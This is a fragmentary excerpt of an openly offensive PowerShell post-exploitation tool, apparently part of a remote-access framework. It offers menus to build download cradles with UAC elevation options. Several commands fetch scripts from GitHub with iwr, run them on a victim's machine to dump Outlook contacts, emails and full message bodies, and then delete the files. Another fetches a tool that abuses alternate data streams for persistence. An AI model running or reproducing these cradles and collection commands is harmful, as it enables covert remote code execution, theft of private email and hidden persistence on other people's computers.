  ...
  If($Python_version)
  {
    ...
    ElseIf($FlavorSellection -eq 4)
    {
       ...
       If($RunEXElevated -iMatch '^(y|yes)$')
       {
          ...
          powershell -file crandle_builder.ps1 -VbsName "Download_Crandle.vbs" -UACElevation 'true'|Out-Null
       }
       Else
       {
          powershell -file crandle_builder.ps1 -VbsName "Download_Crandle.vbs" -UACElevation 'false'|Out-Null
       }
  ...
  If(-not ($WaitData))
  {
    ...
    If($Command -ieq "AdvInfo" -or $Command -ieq "adv")
    {
      ...
      If($choise -ieq "OutLook")
      {
         ...
         write-host "   Emails    Display Outlook Items <Info>    Client:User - Privileges Required";
         write-host "   Filter    SenderName Objects <Info|Body>  Client:User - Privileges Required";
         write-host "   FullDump  Display Outlook Items <Body>    Client:User - Privileges Required";
         ...
         If($OutLook_choise -ieq "Contacts")
         {
            ...
            #Execute command remotely
            Write-Host " * Scanning OutLook for Contact Objects <Info>" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'contacts' -logfile `"$CreateLogFileSetting`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force"
         }
         If($OutLook_choise -ieq "Emails")
         {
            ...
            #Execute command remotely
            Write-Host " * Scanning OutLook for Email Objects <Info>" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'enum' -emailscount `"$MaxOfObjectsToDisplay`" -logfile `"$CreateLogFileSetting`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force"
         }
         If($OutLook_choise -ieq "Filter" -or $OutLook_choise -ieq "SenderName")
         {
            ...
            Else
            {
               ...
               #Execute command remotely
               Write-Host " * Scanning OutLook for Email Objects <Info>" -ForegroundColor Green
               $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'enum' -emailscount `"$MaxOfObjectsToDisplay`" -logfile `"$CreateLogFileSetting`" -Filter `"$SenderNameSearch`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force"
            }
         }
         If($OutLook_choise -ieq "FullDump")
         {
            Write-Host " - Max outlook items to display: " -NoNewline;
            $MaxOfObjectsToDisplay = Read-Host;
            If(-not($MaxOfObjectsToDisplay) -or $MaxOfObjectsToDisplay -ieq $null)
            ...
            #Execute command remotely
            Write-Host " * Scanning OutLook Email Objects <BODY>" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'enum' -emailscount `"$MaxOfObjectsToDisplay`" -logfile `"$CreateLogFileSetting`" -verb `"True`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force"         
         }
      ...
      If($choise -ieq "Persist" -or $choise -ieq "persistance")
      {
        ...
        If($startup_choise -ieq "ADSRUN" -or $startup_choise -ieq "ADS")
        {
           ...
           ElseIf($Chosen_Option -iMatch '^(find)$')
           {
              ...
              $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AdsMasquerade.ps1`" -OutFile `"`$Env:TMP\AdsMasquerade.ps1`"|Unblock-File;powershell -file `$Env:TMP\AdsMasquerade.ps1 -ADS `"enum`" -streamdata `":`" -StartDir `"$StartDir`";Remove-Item -Path `"`$Env:TMP\AdsMasquerade.ps1`" -Force";
           }
